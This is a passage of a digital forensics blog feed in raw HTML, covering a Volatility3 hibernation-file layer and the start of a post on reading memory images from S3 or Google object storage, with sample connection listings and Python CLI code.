2023-09-30 14:52:12.000000</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0xe50734ab2e50	TCPv6	::	49664	::	0	LISTENING	628	wininit.exe	2023-09-30 14:52:12.000000</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0xe50734ab34e0	TCPv4	0.0.0.0	49664	0.0.0.0	0	LISTENING	628	wininit.exe	2023-09-30 14:52:12.000000</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0xe50734ab38d0	TCPv4	0.0.0.0	135	0.0.0.0	0	LISTENING	932	svchost.exe	2023-09-30 14:52:12.000000</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0xe50734d624e0	TCPv4	192.168.122.74	49687	20.223.46.67	443	ESTABLISHED	2552	MsMpEng.exe	2023-09-30 14:52:17.000000</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0xe5073540a990	TCPv4	192.168.122.74	139	0.0.0.0	0	LISTENING	4	System	2023-09-30 14:52:12.000000</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0xe5073540b410	TCPv4	0.0.0.0	49665	0.0.0.0	0	LISTENING	952	svchost.exe	2023-09-30 14:52:12.000000</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0xe5073540b800	TCPv4	0.0.0.0	49666	0.0.0.0	0	LISTENING	1416	svchost.exe	2023-09-30 14:52:12.000000</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0xe5073540c130	TCPv4	0.0.0.0	49666	0.0.0.0	0	LISTENING	1416	svchost.exe	2023-09-30 14:52:12.000000</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0xe5073540c130	TCPv6	::	49666	::	0	LISTENING	1416	svchost.exe	2023-09-30 14:52:12.000000</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0xe5073540c3d0	TCPv4	0.0.0.0	49665	0.0.0.0	0	LISTENING	952	svchost.exe	2023-09-30 14:52:12.000000</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0xe5073540c3d0	TCPv6	::	49665	::	0	LISTENING	952	svchost.exe	2023-09-30 14:52:12.000000</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[TRUNCATED]</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="conclusion">Conclusion<a href="https://forensicxlab.github.io/blog/hibernation#conclusion" class="hash-link" aria-label="Direct link to Conclusion" title="Direct link to Conclusion">‚Äã</a></h2>
<p>For all tested files, the framework was able to extract and decompress all of the pages in each restoration sets. The hibernation layer <strong>currently only support Windows 8 x64 to Windows 11 23H2 x64 hibernation files</strong>. Windows server hibernation analysis was not tested yet but it will come in time. Hopping the forensics community will also test this new addition and give some feedback to improve this layer. You can find the feature here: <a href="https://github.com/forensicxlab/volatility3/tree/feature/hibernation-layer" target="_blank" rel="noopener noreferrer">https://github.com/forensicxlab/volatility3/tree/feature/hibernation-layer</a>.</p>
<p>Hoping this article will bring back the interests of the Digital Forensics community to hibernation files which are very valuable when available.</p>
<p>Special thanks to Chad Tilbury @chadtilbury who gave me the motivation to dive into this project and the team of researchers behind the Hibernation file structure analysis (Joe T. Sylve, Vico Marziale, Golden G. Richard III).</p>
<blockquote>
<p>Do not hesitate to reach me at <a href="mailto:felix.guyard@forensicxlab.com" target="_blank" rel="noopener noreferrer">felix.guyard@forensicxlab.com</a> to enhance this article or to comment on the integration to the volatility framework.</p>
</blockquote>
<!-- -->
<section data-footnotes="true" class="footnotes"><h2 class="anchor anchorWithStickyNavbar_LWe7 sr-only" id="footnote-label">Footnotes<a href="https://forensicxlab.github.io/blog/hibernation#footnote-label" class="hash-link" aria-label="Direct link to Footnotes" title="Direct link to Footnotes">‚Äã</a></h2>
<ol>
<li id="user-content-fn-1-602a43">
<p><a href="https://www.cct.lsu.edu/~golden/Papers/sylvehiber.pdf" target="_blank" rel="noopener noreferrer">https://www.cct.lsu.edu/~golden/Papers/sylvehiber.pdf</a> <a href="https://forensicxlab.github.io/blog/hibernation#user-content-fnref-1-602a43" data-footnote-backref="" aria-label="Back to reference 1" class="data-footnote-backref">‚Ü©</a></p>
</li>
<li id="user-content-fn-2-602a43">
<p><a href="https://www.vergiliusproject.com/kernels/x64/Windows%2011/Insider%20Preview%20(Jun%202021)/PO_MEMORY_IMAGE" target="_blank" rel="noopener noreferrer">https://www.vergiliusproject.com/kernels/x64/Windows%2011/Insider%20Preview%20(Jun%202021)/PO_MEMORY_IMAGE</a> <a href="https://forensicxlab.github.io/blog/hibernation#user-content-fnref-2-602a43" data-footnote-backref="" aria-label="Back to reference 2" class="data-footnote-backref">‚Ü©</a></p>
</li>
<li id="user-content-fn-3-602a43">
<p><a href="https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-xca/a8b7cb0a-92a6-4187-a23b-5e14273b96f8" target="_blank" rel="noopener noreferrer">https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-xca/a8b7cb0a-92a6-4187-a23b-5e14273b96f8</a> <a href="https://forensicxlab.github.io/blog/hibernation#user-content-fnref-3-602a43" data-footnote-backref="" aria-label="Back to reference 3" class="data-footnote-backref">‚Ü©</a> <a href="https://forensicxlab.github.io/blog/hibernation#user-content-fnref-3-602a43-2" data-footnote-backref="" aria-label="Back to reference 3-2" class="data-footnote-backref">‚Ü©<sup>2</sup></a> <a href="https://forensicxlab.github.io/blog/hibernation#user-content-fnref-3-602a43-3" data-footnote-backref="" aria-label="Back to reference 3-3" class="data-footnote-backref">‚Ü©<sup>3</sup></a> <a href="https://forensicxlab.github.io/blog/hibernation#user-content-fnref-3-602a43-4" data-footnote-backref="" aria-label="Back to reference 3-4" class="data-footnote-backref">‚Ü©<sup>4</sup></a></p>
</li>
<li id="user-content-fn-4-602a43">
<p><a href="https://raw.githubusercontent.com/Velocidex/go-prefetch/master/lzxpress.go" target="_blank" rel="noopener noreferrer">https://raw.githubusercontent.com/Velocidex/go-prefetch/master/lzxpress.go</a> <a href="https://forensicxlab.github.io/blog/hibernation#user-content-fnref-4-602a43" data-footnote-backref="" aria-label="Back to reference 4" class="data-footnote-backref">‚Ü©</a> <a href="https://forensicxlab.github.io/blog/hibernation#user-content-fnref-4-602a43-2" data-footnote-backref="" aria-label="Back to reference 4-2" class="data-footnote-backref">‚Ü©<sup>2</sup></a></p>
</li>
<li id="user-content-fn-5-602a43">
<p><a href="https://learn.microsoft.com/en-us/windows/win32/cmpapi/using-the-compression-api" target="_blank" rel="noopener noreferrer">https://learn.microsoft.com/en-us/windows/win32/cmpapi/using-the-compression-api</a> <a href="https://forensicxlab.github.io/blog/hibernation#user-content-fnref-5-602a43" data-footnote-backref="" aria-label="Back to reference 5" class="data-footnote-backref">‚Ü©</a></p>
</li>
</ol>
</section>]]></content:encoded>
            <category>DFIR</category>
            <category>Volatility</category>
            <category>Memory Forensics</category>
            <category>Hibernation</category>
        </item>
        <item>
            <title><![CDATA[üìò Volatility3 - Remote analysis on cloud object-storage.]]></title>
            <link>https://forensicxlab.github.io/blog/vols3</link>
            <guid>https://forensicxlab.github.io/blog/vols3</guid>
            <pubDate>Wed, 23 Aug 2023 00:00:00 GMT</pubDate>
            <description><![CDATA[Memory forensics is a huge help when performing an investigation and during incident response. Collecting memory images and analyzing them at scale is a challenge.]]></description>
            <content:encoded><![CDATA[<p>Memory forensics is a huge help when performing an investigation and during incident response. Collecting memory images and analyzing them at scale is a challenge.</p>
<p>It is crucial to have the capability of examining memory images on storage platforms other than traditional file systems. With the emergence of cloud technologies, new forms of storage known as object storage have emerged. Enabling memory analysis on object storage provides exciting opportunities for innovation and advancement.</p>
<p>In this article, we will go through the journey of making the volatility3 framework compatible with s3 object-storage to perform memory analysis over the network. Also, the reader will discover how this new capability can and will be applied to the VolWeb 2.0 project which is still in developpement.</p>
<blockquote>
<p><strong>Disclaimer :</strong> All of the information about the volatility3 framework given in this blogpost are from my own understanding of the framework and of the project documentation<sup><a href="https://forensicxlab.github.io/blog/vols3#user-content-fn-1-a3ad40" id="user-content-fnref-1-a3ad40" data-footnote-ref="true" aria-describedby="footnote-label">1</a></sup>. Feel free to contact me at <a href="mailto:felix.guyard@forensicxlab.com" target="_blank" rel="noopener noreferrer">felix.guyard@forensicxlab.com</a> to correct any mistake made in the explanations.</p>
</blockquote>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="object-storage">Object-storage<a href="https://forensicxlab.github.io/blog/vols3#object-storage" class="hash-link" aria-label="Direct link to Object-storage" title="Direct link to Object-storage">‚Äã</a></h2>
<p>Object storage is a type of data storage architecture that manages data as objects, rather than as blocks or files like traditional storage systems. In object storage, a unique identifier is assigned to each piece of data and stored in a flat address space. These objects can contain not only the data itself, but also metadata and other attributes that provide additional information about the object. One of the key features of object storage is its scalability and it is ideal for storing big data sets like digital forensics evidence for example.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="support-of-object-storage-in-volatility3">Support of object-storage in volatility3<a href="https://forensicxlab.github.io/blog/vols3#support-of-object-storage-in-volatility3" class="hash-link" aria-label="Direct link to Support of object-storage in volatility3" title="Direct link to Support of object-storage in volatility3">‚Äã</a></h2>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="volatility3-state-of-the-art">Volatility3 state of the art<a href="https://forensicxlab.github.io/blog/vols3#volatility3-state-of-the-art" class="hash-link" aria-label="Direct link to Volatility3 state of the art" title="Direct link to Volatility3 state of the art">‚Äã</a></h3>
<p>The native volatility3 framework currently provides one method for accessing data when performing the contextualization on a memory image which is direct access on a traditionnal filesystem.</p>
<p>When an analyst is using volatility3 to extract data using a plugin, the framework is building the context "behind the scenes", which is the most critical step in the memory forensics workflow aside from the aquisition and analysis steps. This step is too often overlooked/forgotten by some investigators.</p>
<p>In the framework, the data contextualisation is made via "layering" and "stacking".
Each layer in volatility3 focuses on a particular aspect of memory forensics, such as parsing specific data structures, analyzing various kinds of artifacts, or understanding specific evidence formats. The layers can be seen as individual building blocks that can be stacked on top of each other in a specific order to build the right context before extracting data for analysis. As an example, a memory image with the "vmem" format will induce the stacking of the "VmwareLayer" to be able to read such file format and extract data.</p>
<p>One of the layer is called the "FileLayer" or "physical". One of the usage of this layer by the framework is to know how to locate, open, read and overall access resources of the evidence provided by the investigator. The FileLayer is using what is called a "ResourceAccessor" to interface with the physical evidence.</p>
<div style="background-color:white;align-items:center"><p><img decoding="async" loading="lazy" alt="alt text" src="https://forensicxlab.github.io/assets/images/1-f626d93f59a55d33812e49d833c3684b.png" title="Arch 1" width="4037" height="1191" class="img_ev3q"></p></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="adding-buckets3-support-to-the-filelayer">Adding bucketS3 support to the FileLayer<a href="https://forensicxlab.github.io/blog/vols3#adding-buckets3-support-to-the-filelayer" class="hash-link" aria-label="Direct link to Adding bucketS3 support to the FileLayer" title="Direct link to Adding bucketS3 support to the FileLayer">‚Äã</a></h3>
<p>The FileLayer currently support one type of resource accessor which is the <strong>file://</strong> and <strong>http(s)://</strong> url patterns. They are used to read the evidence and remote pdb files by using the urllib python3 library.</p>
<p>By giving the possibility to the analyst to indicate that the evidence as to be read from remote object storage we can pass this information to the context and create an other resource accessor.</p>
<div style="background-color:white;align-items:center"><p><img decoding="async" loading="lazy" alt="alt text" src="https://forensicxlab.github.io/assets/images/2-eb572296be2691211a728fa9e99eacb4.png" title="Arch 2" width="5751" height="2784" class="img_ev3q"></p></div>
<p>Here is what was done to make this possible :</p>
<p>Adding new mutually exclusive argument group to the framework CLI : "-s3/--amazon-bucket"/"-gs/--google-bucket"</p>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">group </span><span class="token operator">=</span><span class="token plain"> parser</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">add_mutually_exclusive_group</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">group</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">add_argument</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">	</span><span class="token string" style="color:rgb(255, 121, 198)">"-s3"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">	</span><span class="token string" style="color:rgb(255, 121, 198)">"--amazon-bucket"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">	action</span><span class="token operator">=</span><span class="token string" style="color:rgb(255, 121, 198)">'store_true'</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">	</span><span class="token builtin" style="color:rgb(189, 147, 249)">help</span><span class="token operator">=</span><span class="token string" style="color:rgb(255, 121, 198)">"The file provided will come from an amazon bucket"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">group</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">add_argument</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">	</span><span class="token string" style="color:rgb(255, 121, 198)">"-gs"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">	</span><span class="token string" style="color:rgb(255, 121, 198)">"--google-bucket"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">	action</span><span class="token operator">=</span><span class="token string" style="color:rgb(255, 121, 198)">'store_true'</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">	</span><span class="token builtin" style="color:rgb(189, 147, 249)">help</span><span class="token operator">=</span><span class="token string" style="color:rgb(255, 121, 198)">"The file provided will come from a google bucket"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>Next the CLI will check that the required environment variables are present to reach the bucket requested. Here is an example for Amazon S3/Minio.</p>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">        </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">if</span><span class="token plain"> args</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">amazon_bucket</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">            </span><span class="token comment" style="color:rgb(98, 114, 164)"># First check if the global variables are set and set the cloud location</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">            </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">try</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                aws_access_key_id </span><span class="token operator">=</span><span class="token plain">  os</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">getenv</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">"AWS_ACCESS_KEY_ID"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                aws_secret_access_key </span><span class="token operator">=</span><span class="token plain"> os</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">getenv</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">"AWS_SECRET_ACCESS_KEY"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                endpoint_url </span><span class="token operator">=</span><span class="token plain"> os</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">getenv</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">"AWS_ENDPOINT_URL"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">if</span><span class="token plain"> aws_access_key_id </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">is</span><span class="token plain"> </span><span class="token boolean">None</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                    </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">raise</span><span class="token plain"> ValueError</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">"AWS_ACCESS_KEY_ID environment variable is not set"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">if</span><span class="token plain"> aws_secret_access_key </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">is</span><span class="token plain"> </span><span class="token boolean">None</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                    </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">raise</span><span class="token plain"> ValueError</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">"AWS_SECRET_ACCESS_KEY environment variable is not set"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">if</span><span class="token plain"> endpoint_url </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">is</span><span class="token plain"> </span><span class="token boolean">None</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                    </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">raise</span><span class="token plain"> ValueError</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">"AWS_ENDPOINT_URL environment variable is not set"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">            </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">except</span><span class="token plain"> ValueError </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">as</span><span class="token plain"> excp</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                parser</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">error</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token builtin" style="color:rgb(189, 147, 249)">str</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">excp</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">            </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">except</span><span class="token plain"> KeyError </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">as</span><span class="token plain"> excp</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                parser</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">error</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token builtin" style="color:rgb(189, 147, 249)">str</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">excp</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"> </span><span class="token operator">+</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">" environment variable is not set"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">            ctx</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">config</span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token string" style="color:rgb(255, 121, 198)">"Cloud.AWS"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token plain"> </span><span class="token operator">=</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">"True"</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>When stacking the various layers and attaching them to a specific requirement, the FileLayer is stacked :</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">physical_layer = physical.FileLayer(</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">	new_context, current_config_path, current_layer_name</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">new_context.add_layer(physical_layer)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>Notice that the FileLayer object is created. We need to enhance the FileLayer object in order for it to determine the right resource accessor by looking at the context configuration:</p>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">class</span><span class="token plain"> </span><span class="token class-name">FileLayer</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">interfaces</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">layers</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">DataLayerInterface</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token triple-quoted-string string" style="color:rgb(255, 121, 198)">"""a DataLayer backed by a file on the filesystem."""</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">def</span><span class="token plain"> </span><span class="token function" style="color:rgb(80, 250, 123)">__init__</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        context</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"> interfaces</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">context</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">ContextInterface</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        config_path</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"> </span><span class="token builtin" style="color:rgb(189, 147, 249)">str</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        name</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"> </span><span class="token builtin" style="color:rgb(189, 147, 249)">str</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        metadata</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"> Optional</span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token plain">Dict</span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token builtin" style="color:rgb(189, 147, 249)">str</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> Any</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token plain"> </span><span class="token operator">=</span><span class="token plain"> </span><span class="token boolean">None</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"> </span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token plain"> </span><span class="token boolean">None</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        </span><span class="token builtin" style="color:rgb(189, 147, 249)">super</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 